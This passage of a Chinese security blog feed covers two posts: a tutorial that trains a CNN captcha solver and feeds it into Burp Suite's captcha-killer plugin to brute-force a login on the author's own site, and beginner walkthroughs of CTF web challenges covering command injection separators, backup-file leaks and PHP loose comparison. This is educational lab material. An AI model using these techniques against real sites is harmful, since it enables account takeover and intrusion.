需要注意的是，如果新的样本中有新增的标签，你需要把新的标签增加到char_set配置中或者labels.json文件中</p>
<p>训练集和测试集都有了之后，接下来就是训练模型，运行train_model.py文件进行模型训练<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%409HLQA8%28J%7D%7B_1E1%7DVJEI%60%7BR.png" alt=""><br>
训练模型的速度取决取决于你的电脑，可能几十分钟，可能几个小时或者几十个小时不等，可以重复多次运行文件进行训练提高准确率<br>
这里贴张下面讲实战中使用的模型的训练图片，使用了2000张验证码图片，我的电脑跑了一分钟左右的时间吧<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%28LUUW%28M9X%7DFU9G%7DGJL5TQPR.png" alt=""><br>
接下来我们运行test_batch.py文件进行一个验证<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5D4KSDH%60KUWFJO%7DKUY61P~ZY.png" alt=""><br>
接着启动接口的api，运行webserver_recognize_api.py，此时占一个会话窗口<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WHR9A%25W0%5BL878MEGG~%7DB%40%605.png" alt=""><br>
再次运行，默认是6000端口，这里我改成了7000端口<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/GE~ZGQURWU%282PL%7D%7BE7H1%28W0.png" alt=""><br>
启动recognize_local.py文件发送请求进行一个验证<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/Z7%7B_4%29F8%60F%5D4%60DUT%7DP4TV_I.png" alt=""><br>
接口返回数据就ok啦~</p>
<h2 id="captcha-killer的安装"><a class="header-anchor" href="#captcha-killer的安装">¶</a>captcha-killer的安装</h2>
<p>项目地址:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;captcha-killer&#x2F;releases</span><br></pre></td></tr></table></figure>
<p>下载好jar包之后，打开burpsuite进行安装<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/BGR%24~525EAJZ%7D%257%60QJ%7BBFLP.png" alt=""></p>
<h1>实战</h1>
<p>首先使用python爬虫对网站的验证码进行一个爬取<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/1IOO51MC64~YFHOLE%7D_%5B%24LN.png" alt=""><br>
然后按照上面的步骤进行一个模型训练<br>
这是我本人服务器上搭建的网站<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
首先，我们需要抓取生成验证码文件的包，然后右键发送到captcha面板上<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154445.png" alt=""><br>
然后在killer面板上，点击一下获取，就可以出现验证码图片和信息了<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/2~EOM%5B%25%5BN%7BFNI%40L%28ZM~2DZU.png" alt=""><br>
然后我们需要在webserver_recognize_api.py文件新增加一个方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/base64&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_imageBase64</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form[<span class="string">&#x27;image_file&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">        timec = str(time.time()).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        file = request.form[<span class="string">&#x27;image_file&#x27;</span>]</span><br><span class="line">        img = base64.b64decode(file)</span><br><span class="line">        img = BytesIO(img)</span><br><span class="line">        img = Image.open(img, mode=<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="comment"># username = request.form.get(&quot;name&quot;)</span></span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸: &#123;&#125;&quot;</span>.format(img.size))</span><br><span class="line">        img_size = img.resize((image_width, image_height), Image.ANTIALIAS)</span><br><span class="line">        print(<span class="string">&quot;接收图片尺寸2：&#123;&#125;&quot;</span>.format(img_size))</span><br><span class="line">        s = time.time()</span><br><span class="line">        value = R.rec_image(img_size)</span><br><span class="line">        e = time.time()</span><br><span class="line">        print(<span class="string">&quot;识别结果: &#123;&#125;&quot;</span>.format(value))</span><br><span class="line">        <span class="comment"># 保存图片</span></span><br><span class="line">        print(<span class="string">&quot;保存图片： &#123;&#125;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(api_image_dir, value, timec, image_suffix))</span><br><span class="line">        file_name = <span class="string">&quot;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(value, timec, image_suffix)</span><br><span class="line">        file_path = os.path.join(api_image_dir + file_name)</span><br><span class="line">        img.save(file_path)</span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: timec,   <span class="comment"># 时间戳</span></span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>: value,  <span class="comment"># 预测的结果</span></span><br><span class="line">            <span class="string">&#x27;speed_time(ms)&#x27;</span>: int((e - s) * <span class="number">1000</span>)  <span class="comment"># 识别耗费的时间</span></span><br><span class="line">        &#125;</span><br><span class="line">        img.close()</span><br><span class="line">        <span class="keyword">return</span> jsonify(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = json.dumps(&#123;<span class="string">&quot;error_code&quot;</span>: <span class="string">&quot;1001&quot;</span>&#125;)</span><br><span class="line">        resp = response_headers(content)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
<p>因为原本的方法up_image()是发送本地图片文件的形式，而我们在captcha_killer需要通过发送表单请求来进行接收<br>
接着再发送一个requests请求，进行抓包后发送到interface面板上<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154703.png" alt=""><br>
然后我们把图片内容的位置用标签来代替。<br>
比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么Requst template(请求模版)面板应该填写如下：<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WI%40%604SZ%29%5D4CUK%256MCFK042G.png" alt=""><br>
接口模板设置：</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>标签</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</td>
<td>代表验证码图片原二进制内容</td>
</tr>
<tr>
<td>2</td>
<td>&lt;@URLENCODE&gt;<a href="mailto:/@URLENCODE">/@URLENCODE</a></td>
<td>对标签内的内容进行url编码</td>
</tr>
<tr>
<td>3</td>
<td>&lt;@BASE64&gt;<a href="mailto:/@BASE64">/@BASE64</a></td>
<td>对标签内的内容进行base64编码</td>
</tr>
</tbody>
</table>
<p>然后点击识别，即可获取到接口返回的数据包<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/E%7BZN79%25Z56%7B5W5%7D%7B%28CQAG~I.png" alt=""><br>
这里的匹配方式规则：</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>规则类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Repose  data</td>
<td>这种规则用于匹配接口返回包内容直接是识别结果</td>
</tr>
<tr>
<td>2</td>
<td>Regular  expression</td>
<td>正则表达式,适合比较复杂的匹配。比如接口返回包{“coede”:1,“result”:“abcd”}说明abcd是识别结果，我们可以编写规则为result&quot;:“(.*?)”}</td>
</tr>
<tr>
<td>3</td>
<td>Define  the start and end positions</td>
<td>定义开始和结束位置,使用上面的例子，可以编写规则{“start”:21,“end”:25}</td>
</tr>
<tr>
<td>4</td>
<td>Defines  the start and end strings</td>
<td>定义开始和结束字符，使用上面的例子，可以编写规则为{“start”:“result”:“,“end”:”“}”}</td>
</tr>
</tbody>
</table>
<p>确认识别无误之后，点击锁定，避免一会进行爆破时出错</p>
<p>接下来我们去抓取登录界面发送的包，然后发送到intruder面板，然后设置参数<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/AHZMTVCB%60RAA%28X4X3MKI%28GI.png" alt=""><br>
验证码的pyload选择我们的插件进行生成<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/VI%256A%7BKPX3DTJSZU5T%25Y0P3.png" alt=""><br>
成功拿到密码<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5BS2N%29%5BR%7BF%7D4OJHTGJ0QDB%7B3.png" alt=""></p>
<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Web区~持续更新中！</title>
    <url>/posts/14571/</url>
    <content><![CDATA[<h1>新手练习区</h1>
<ul>
<li>
<h2 id="view-source"><a class="header-anchor" href="#view-source">¶</a>view source</h2>
<hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/NE96%7DBO%60EX%28%5B%40YGU%25FPT%29I3.png" alt=""></p>
<p>题目提示查看源代码，但无法使用右键打开开发者模式，我们这个时候可以使用f12快捷键打开开发者模式</p>
<br>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%242%29AW49Y%5BP5%407W%7BM8%7D%25S%40%25R.png" alt=""></p>
<br>
<p>flag就藏在源代码里，我们操练起cv大法，然后提交拿分~~~</p>
</li>
<li>
<h2 id="robots"><a class="header-anchor" href="#robots">¶</a>robots</h2>
<hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/_6%5D5%7B%7DXV%29FML%60R14%7DQMV9N4.png" alt=""></p>
<br>
<blockquote>
<p>Robots协议是Web站点和搜索引擎爬虫交互的一种方式，Robots.txt是存放在站点根目录下的一个纯文本文件。该文件可以指	定搜索引擎爬虫只抓取指定的内容，或者是禁止搜索引擎爬虫抓取网站的部分或全部内容。当一个搜索引擎爬虫访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索引擎爬虫就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索引擎爬虫就沿着链接抓取。另外，robots.txt必须放置在一个站点的根目录下，而且文件名必须全部小写。</p>
</blockquote>
<br>
<p>所以我们在url输入robots.txt</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/H%5BM%5D%25%29J%5BP89Q9BM2U8~11VI.png" alt=""></p>
<p>跳转到页面，提示我们还有个f1ag_1s_h3re.php,我们继续访问文件</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%7BQ%25D9C7260DI5L%5BSMIY8X2G.png" alt=""></p>
<br>
<p>即可拿到flag呦~</p>
</li>
<li>
<h2 id="backup"><a class="header-anchor" href="#backup">¶</a>backup</h2>
<hr>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/4VR%40591%60F0%7D%5BYOQ%40X5%5D%7BYEF.png" alt=""></p>
<br>
<p>这道题提示我们是文件备份，文件泄露的问题</p>
<p>常见的备份文件名为：index.php~和index.php.bak</p>
<p>试着输入了一下，没想到成功下载了文件，打开文件，即可得到flag嗷~</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>备份文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line"><span class="css">            <span class="selector-tag">margin-left</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-right</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-TOP</span><span class="selector-pseudo">:200PX</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:20em</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>你知道index.php的备份文件名吗？<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">$<span class="attr">flag</span>=<span class="string">&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;</span></span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<br>
<p>本题也可使用目录遍历搜索</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Y2LMCC%25TTM%5D%7BJ474Q3N42%5BD.png" alt=""></p>
<p>感觉自己是不是有点厉害了现在,操练起兵器，我们继续闯关，冲冲冲~</p>
</li>
<li>
<h2 id="cookie"><a class="header-anchor" href="#cookie">¶</a>cookie</h2>
<hr>
<p>此关提示我们信息在cookie中</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/U1SU0%29T8J378V4ULADE%5DAL5.png" alt=""></p>
<br>
<p>去查看文件的请求头和响应头信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%2450CQV6YEE5P%40%28SH%29_GUBCQ.png" alt=""></p>
<br>
<p>提示我们去查看cookie.php，我们去访问这个文件，让我们继续看文件响应头</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/N%28OZ%25%7D57V5%7BB_9J%7DJ%28N5K%28J.png" alt=""></p>
<br>
<p>打开文件查看响应头，gogogo！</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/9W43RJ_R%25UC%7D3W%408%28%24DROGI.png" alt=""></p>
<br>
<p>flag就出现在了我们面前，金币++，开心~</p>
</li>
<li>
<h2 id="disabled-button"><a class="header-anchor" href="#disabled-button">¶</a>disabled_button</h2>
<hr>
<p>题目提示页面按钮不能打开，点击了发现确实打不开</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/0QDTUEI%5DW3HBBG_VJKPY%60~S.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/%5D608EGFTAJL%29U%24AOJALE4%5BX.png" alt=""></p>
<br>
<p>这时候运用到我们html的知识，前台万物可更改！我们打开源码修改属性，把disabled去掉，按钮即可打开</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/2F%40%40E_S6P5JDKK%7B~0%60%609BL1.png" alt=""></p>
<br>
<p>点击后，flag就出现啦~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/17LAH%25%7B9QR%60%7DB%24F%7BSGZ5BMD.png" alt=""></p>
</li>
<li>
<h2 id="weak-auth"><a class="header-anchor" href="#weak-auth">¶</a>weak_auth</h2>
<hr>
<p>本题提示为弱密码爆破</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/7O1MJB2%607W_M~F%60QVKQ4SLL5.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/YU%60V%60%7B9Y16XM%5BY1Y%28%5B4FZF7.png" alt=""></p>
<br>
<p>我们尝试抓包查看源代码，发现提示我们用户名为admin，使用密码爆破</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/%24R_D76HB0S%409GL%24RMWZ50FM.png" alt=""></p>
<br>
<p>我们使用字典配合burpsuite进行一个爆破，最后得到结果~，在响应包里拿到flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/VD2TF%7BN%5DP%60F47D%40%7DZI9%60EG8.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/NA9%25KLH%29H95R14I0E%28%243X46.png" alt=""></p>
</li>
<li>
<h2 id="command-execution"><a class="header-anchor" href="#command-execution">¶</a>command_execution</h2>
<hr>
<p>本题给了我们一个ping页面，我们尝试ping了本机地址之后回显信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/RY~GME%5DY0S%7BCWA11S%28%24KUYE.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/881NMO91RVEV%29%7BO4%5D%29L%7DKTC.png" alt=""></p>
<br>
<p>页面回显ping -c 3 127.0.0.1 ，这里提示我们这是linux系统，ping三次。我们尝试使用linux命令执行，同时执行多条命令，发现有回显</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/%7BPQ%7DQ33TMU1UC%297_%25UL3%5BQC%20%281%29.png" alt=""></p>
<br>
<p>于是我们尝试寻找带有flag的文件~，可以用；多条执行也可以使用|只执行后面的语句</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/F8F%60R%7DHS%5B_J8UDX%28IQE0%5B26.png" alt=""></p>
<br>
<p>发现flag.txt可疑文件，我们去查看一下</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/_M4D~KMQ~K%7D%7BKET0TJSEQ31.png" alt=""></p>
<p>轻轻松松获得flag咯~</p>
<br>
<p><strong>扩充知识：</strong></p>
<p>| <strong>常见连接符</strong> | <strong>举例</strong> | <strong>效果</strong>                    |<br>
| -------------- | -------- | --------------------------- |<br>
| ;              | A;B      | 先执行A，再执行B            |<br>
| &amp;              | A&amp;B      | 简单拼接，A B之间无制约关系 |<br>
| |             | A|B     | 显示B的执行结果             |<br>
| &amp;&amp;             | A&amp;&amp;B     | A执行成功，然后才会执行B    |<br>
| ||           | A||B   | A执行失败，然后才会执行B    |</p>
</li>
<li>
<h2 id="simple-php"><a class="header-anchor" href="#simple-php">¶</a>simple_php</h2>
<hr>
<p>本题需要我们掌握php弱类型比较，打开环境给出我们一些源码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/W%7DIBQVLJ20X%7BPN4H%5BOWVT5S.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/XYN%25%7B%60Q%5BS31GMA4%29B41AA%256.png" alt=""></p>
<p>首先我们分析一下源代码：</p>
<p>1）有include函数，包含了config.php文件</p>
<p>2）url需要接收参数a和参数b</p>
<p>3）如果$a=0或者$a为真,输出$flag1</p>
<p>4）如果b是数字或者字符串，如果$b&gt;1234就输出$flag2</p>
<br>
<p>总结，我们构造a参数得等于0且不为假，构造b参数&gt;1234且不能为数字和字符串。</p>
<p>粗略来看，这不是难为我们吗！!不过兄弟莫慌，这个时候我们想起前面所说的php弱类型比较，那这弱类型到底指的什么呢？下面我们一起学习一下~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">掌握php弱类型比较</span><br><span class="line">php中其中两种比较符号:</span><br><span class="line">&#x3D;&#x3D;：先将字符串类型转化成相同，再比较</span><br><span class="line">&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较</span><br><span class="line">字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较</span><br><span class="line">var_dump(&#39;a&#39; &#x3D;&#x3D; 0);&#x2F;&#x2F;true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0</span><br><span class="line">var_dump(&#39;123a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;true，这里&#39;123a&#39;会被转换为123</span><br><span class="line"></span><br><span class="line">var_dump(&#39;a123&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。</span><br><span class="line">举例：</span><br><span class="line">var_dump(&#39;123a1&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;true</span><br><span class="line">var_dump(&#39;1233a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;false</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看完之后，是不是突然恍然大悟！所以我们尝试构造<strong>a=0a&amp;b=1234a</strong>输入</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/DE5%7D3O9%5B%40%40BTDQN%25O%5BSF%7BXU.png" alt=""></p>
<br>
<p>如此，取flag如探囊取物~</p>
</li>
<li>
<h2 id="get-post"><a class="header-anchor" href="#get-post">¶</a>get_post</h2>
<hr>
<p>这道题很简单，就是让我们发送get请求和post请求。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/M%5DGS%5BG%60AJ%7D6A_5J%29L%25LKYZR.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/%40%29FMD3S1_I~%25QUZ~%40AK6%5B%7DI.png" alt=""></p>
<br>
